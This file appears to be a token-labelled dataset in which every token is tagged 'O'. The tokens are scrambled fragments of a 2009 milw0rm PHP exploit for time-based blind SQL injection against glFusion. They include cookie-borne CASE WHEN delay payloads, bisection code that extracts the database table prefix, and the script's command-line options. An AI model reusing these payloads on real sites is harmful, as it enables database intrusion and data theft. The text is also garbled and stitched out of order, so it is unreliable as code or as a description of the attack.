CURLOPT_PROXY O
, O
$ O
proxy_host O
. O

users O
WHERE O
$ O
where O
LIMIT O
1 O
) O
THEN O
$ O
delayfunc O
ELSE O
0 O
END O
) O
) O
LIMIT O
1 O
; O
$ O
cookies O
= O
glf_session= O
$ O
sessid O
. O
$ O
sql O
. O

; O
glf_theme=nouveau O
; O
; O

test O
- O
run O
only O
tests O
. O

Not O
vulnerable O
sessid O
= O
login O
( O
) O
; O
$ O
sql O
= O
AND O
( O
CASE O
WHEN O
( O
SELECT O
1 O
) O
THEN O
1 O
ELSE O
0 O
END O
) O
) O
LIMIT O
1 O
; O
$ O
cookies O
= O
glf_session= O
$ O
sessid O
. O
$ O
sql O
. O

; O
sleep O
( O
$ O
n O
) O
; O
break O
if O
( O
$ O
f O
false O
) O
{ O
die O
( O
[ O
! O
] O

Unknown O
error O
print O
your O
cookie- O
> O
glfusion= O
. O
$ O
uid O
. O

) O
; O
} O
else O
{ O
curl_close O
( O
$ O
ch O
) O
; O
} O
return O
$ O
_d O
; O
} O
function O
chk_err O
( O
$ O
s O
) O
{ O
if O
( O
stripos O
( O
$ O
s O
, O
x41 O
x6e O
x20 O
x53 O
x51 O
x4c O
x20 O
x65 O
x72 O
x72 O
x6f O
x72 O
x20 O
x68 O
x61 O
x73 O
x20 O
x6f O
x63 O
x63 O
x75 O
x72 O
x72 O
x65 O
x64 O
) O
) O
{ O
return O
true O
; O
} O
else O
{ O
return O
false O
; O
} O
} O
function O
chk_login O
( O
$ O
s O
) O
{ O
if O
( O
stripos O
( O
$ O
s O
, O
x50 O
x6c O
x65 O
x61 O
x73 O
x65 O
x20 O
x65 O
x6e O
x74 O
x65 O
x72 O
x20 O
x79 O
x6f O
x75 O
x72 O
x20 O
x75 O
x73 O
x65 O
x72 O
x20 O
x6e O
x61 O
x6d O
x65 O
x20 O
x61 O
x6e O
x64 O
x20 O
x70 O
x61 O
x73 O
x73 O
x77 O
x6f O
x72 O
x64 O
x20 O
x62 O
x65 O
x6c O
x6f O
x77 O
) O
) O
{ O
die O
( O
[ O
! O
] O

$ O
_table_prefix O
j O
= O
-15 O
; O
print O
[ O
] O
Initiating O
table O
prefix O
extraction O
while O
( O
! O
$ O
null_f O
) O
{ O
$ O
mn O
= O
0x00 O
; O
$ O
mx O
= O
0xff O
; O
while O
( O
1 O
) O
{ O
if O
( O
( O
$ O
mx O
+ O
$ O
mn O
) O
% O
2 O
1 O
) O
{ O
$ O
c O
= O
round O
( O
( O
$ O
mx O
+ O
$ O
mn O
) O
2 O
) O
- O
1 O
; O
} O
else O
{ O
$ O
c O
= O
round O
( O
( O
$ O
mx O
+ O
$ O
mn O
) O
2 O
) O
; O
} O
$ O
sessid O
= O
login O
( O
) O
; O
$ O
sql O
= O
AND O
( O
CASE O
WHEN O
( O
SELECT O
( O
ASCII O
( O
SUBSTR O
( O
. O
$ O
_tn O
. O

die O
( O
$ O
err O
) O
: O
nil O
; O
} O
} O
function O
syntax O
( O
) O
{ O
print O
( O
Syntax O
: O
php O
. O
$ O
argv O
. O

Mysql O
, O
like O
php O
, O
in O
comparing O
them O
, O
only O
considers O
the O
first O
integer O
values O
of O
the O
supplied O
string O
. O

MySQL O
< O
4.1 O
! O

MySQL O
> O
= O
5.0.12 O
cookies O
z O
= O
0 O
; O
$ O
_w O
= O
10 O
; O
for O
( O
$ O
i O
= O
0 O
; O
$ O
i O
< O
= O
$ O
_w O
; O
$ O
i O
starttime O
= O
time O
( O
) O
; O
$ O
_o O
= O
_s O
( O
$ O
url O
, O
$ O
cookies O
, O
0 O
endtime O
= O
time O
( O
) O
; O
$ O
difftime O
= O
$ O
endtime O
- O
$ O
starttime O
; O
$ O
_z O
= O
$ O
_z O
+ O
$ O
difftime O
; O
} O
$ O
_y O
= O
round O
( O
$ O
_z O
$ O
_w O
) O
; O
$ O
n O
= O
$ O
n O
+ O
$ O
_y O
; O
if O
( O
$ O
_y O
< O
0 O
) O
{ O
print O
( O
[ O
] O
Adjusting O
delay O
time O
of O
. O
$ O
_y O
. O

[ O
host O
] O
[ O
path O
] O
[ O
user O
] O
[ O
pass O
] O
[ O
OPTIONS O
] O
. O

; O
$ O
err O

; O
glfusion=9999999999 O
; O
; O
$ O
url O
= O
$ O
starttime O
= O
time O
( O
) O
; O
$ O
_o O
= O
_s O
( O
$ O
url O
, O
$ O
cookies O
, O
0 O
endtime O
= O
time O
( O
) O
; O
$ O
difftime O
= O
$ O
endtime O
- O
$ O
starttime O
; O
if O
( O
chk_err O
( O
$ O
_o O
) O
) O
{ O
die O
( O
[ O
! O
] O

proxy O
: O
[ O
host O
: O
port O
] O
- O
use O
proxy O
. O

LIKE O
0x25747261636b6261636b636f646573 O
LIMIT O
1 O
) O
THEN O
$ O
delayfunc O
ELSE O
0 O
END O
) O
) O
LIMIT O
1 O
; O
$ O
cookies O
= O
glf_session= O
$ O
sessid O
. O
$ O
sql O
. O

port O
: O
[ O
port O
] O
- O
specify O
a O
port O
. O

default- O
> O
gl_ O
. O

This O
script O
is O
intended O
to O
be O
launched O
from O
the O
cli O
! O

FROM O
$ O
j O
FOR O
1 O
c O
. O
) O

milw0rm.com O
[ O
2009-04-03 O
] O

Table O
prefix O
table_prefix O
. O

Table O
prefix- O
> O
. O
$ O
_table_prefix O
. O

WHERE O
. O
$ O
_tn O
. O

; O
} O
return O
$ O
sessid O
; O
} O
function O
tests O
( O
) O
{ O
global O
$ O
host O
, O
$ O
port O
, O
$ O
path O
, O
$ O
n O
, O
$ O
delayfunc O
; O
$ O
sessid O
= O
login O
( O
) O
; O
$ O
sql O
cookies O
= O
glf_session= O
$ O
sessid O
. O
$ O
sql O
. O

FROM O
. O
$ O
_ift O
. O

; O
glfusion=9999999999 O
; O
; O
$ O
url O
o O
= O
_s O
( O
$ O
url O
, O
$ O
cookies O
, O
0 O
if O
( O
chk_err O
( O
$ O
_o O
) O
) O
{ O
print O
( O
[ O
] O

second O
( O
s O
) O
- O
> O
delay O
= O
. O
$ O
n O
. O

